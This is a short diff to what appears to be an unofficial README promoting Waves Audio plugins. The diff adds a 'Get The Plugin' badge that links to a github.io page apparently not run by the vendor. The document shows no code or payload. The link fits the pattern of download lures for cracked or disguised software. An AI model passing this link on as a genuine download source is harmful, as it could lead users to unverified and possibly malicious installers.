@@ -2,7 +2,7 @@
 
 For more than two decades, **Waves Audio** has been a benchmark in professional music production. Its plugins cover every stage of the audio chain—from EQ and compression to mastering, spatial effects, and noise reduction. Whether you’re mixing in the studio or producing on the go, Waves integrates smoothly with all major DAWs.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Plugin-blueviolet)](https://waves-audio-plugin.github.io/.github/)
 ---
 
 ## Overview
